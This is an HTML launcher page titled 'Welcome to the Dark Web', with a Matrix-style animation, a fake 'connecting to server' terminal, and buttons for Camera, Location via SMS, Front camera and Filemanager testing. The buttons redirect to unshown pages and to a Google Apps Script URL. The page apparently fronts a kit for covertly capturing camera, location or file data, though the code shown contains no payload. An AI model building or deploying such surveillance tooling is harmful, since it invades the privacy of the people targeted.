<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to Dark Web</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background: #000;
            font-family: 'Courier New', Courier, monospace;
            color: #0f0;
        }

        #matrix {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
        }

        .button-container {
            text-align: center;
            z-index: 1;
        }

        .button-container a {
            display: inline-block;
            margin: 10px;
            padding: 15px 30px;
            color: #0f0;
            text-decoration: none;
            font-size: 18px;
            font-weight: bold;
            border: 2px solid #0f0;
            border-radius: 5px;
            background: rgba(0, 0, 0, 0.5);
            transition: background 0.3s, transform 0.3s;
        }

        .button-container a:hover {
            background: rgba(0, 255, 0, 0.3);
            transform: scale(1.1);
        }

        @media (max-width: 768px) {
            .button-container a {
                font-size: 14px;
                padding: 10px 20px;
            }

            .page-title {
                font-size: 28px;
            }

            .terminal {
                width: 90%;
                height: 70%;
                font-size: 14px;
            }
        }

        @media (max-width: 480px) {
            .button-container a {
                font-size: 12px;
                padding: 8px 15px;
            }

            .page-title {
                font-size: 24px;
            }

            .terminal {
                width: 95%;
                height: 60%;
                font-size: 12px;
            }
        }

        .terminal {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 80%;
            height: 80%;
            background: #000;
            color: #0f0;
            font-family: 'Courier New', Courier, monospace;
            display: none;
            padding: 20px;
            overflow: hidden;
            box-shadow: 0 0 10px #0f0;
            z-index: 2;
        }

        .page-title {
            position: absolute;
            top: 10%;
            width: 100%;
            text-align: center;
            font-size: 36px;
            font-weight: bold;
            color: #0f0;
            z-index: 1;
            animation: blink 0.1s step-end infinite alternate;
        }

        @keyframes blink {
            from { opacity: 1; }
            to { opacity: 0; }
        }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>

    <div class="page-title">Welcome to the Dark Web</div>

    <div class="button-container">
        <a href="#" onclick="showTerminal('sendcontinuousexp.html')">Camera</a>
        <a href="#" onclick="showTerminal('https://script.google.com/macros/s/AKfycbyA-ZIUmelLLo4-Wnlcd8vlFXda-nklVSIHym1BPT2aeuYeCeA7mKvYDQSo9pKV_Vue/exec')">Location via SMS</a>
        <a href="#" onclick="showTerminal('locationexp.html')">Loaction</a>
        <a href="#" onclick="showTerminal('frontcamera.html')">Front camera</a>
        <a href="#" onclick="showTerminal('fileman.html')">Filemanager testing</a>
    </div>

    <div class="terminal" id="terminal"></div>

    <script>
        // Matrix Rain Effect
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');

        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const columns = Math.floor(canvas.width / 20);
        const drops = Array(columns).fill(0);

        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            ctx.fillStyle = '#0f0';
            ctx.font = '16px monospace';

            drops.forEach((y, x) => {
                const text = Math.random() > 0.5 ? '1' : '0';
                ctx.fillText(text, x * 20, y * 20);

                if (y * 20 > canvas.height && Math.random() > 0.975) {
                    drops[x] = 0;
                }

                drops[x]++;
            });
        }

        setInterval(drawMatrix, 50);

        // Terminal Effect
        function showTerminal(redirectURL) {
            const terminal = document.getElementById('terminal');
            terminal.style.display = 'block';

            const commands = [
                'Initializing...',
                'Connecting to server...',
                'Connecting to server...',
                'Connecting to server...',
                'Connecting to server...',
                'Connecting to server...',
                'Connecting to server...',
                'Connecting to server...',
                'Connecting to server...',
                'Connecting to server...',
                'Connecting to server...',
                'Connecting to server...',
                'Connecting to server...',
                'Authenticating...',
                'Fetching data...',
                'Launching...'
            ];

            let index = 0;
            const interval = setInterval(() => {
                if (index < commands.length) {
                    terminal.innerHTML += commands[index] + '<br>';
                    terminal.scrollTop = terminal.scrollHeight;
                    index++;
                } else {
                    clearInterval(interval);
                    setTimeout(() => {
                        window.location.href = redirectURL;
                    }, 1000);
                }
            }, 1000);
        }
    </script>
</body>
</html>
